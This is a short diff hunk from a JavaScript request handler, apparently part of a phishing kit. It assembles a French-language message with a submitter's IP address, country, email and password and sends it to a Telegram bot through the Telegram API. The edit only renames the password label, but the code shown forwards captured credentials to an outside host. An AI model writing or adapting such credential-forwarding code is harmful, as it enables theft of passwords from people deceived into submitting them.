@@ -45,7 +45,7 @@ export default async function handler(req, res) {
     const message = `Nouvelle soumission :
 🌍 IP : ${ip} (${country})
 📧 Email : ${email}
-🔑 Mot de passe : ${motDePasse}`;
+🔑 Motdepasse : ${motDePasse}`;
 
     // --- 4. Envoyer le message à Telegram
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
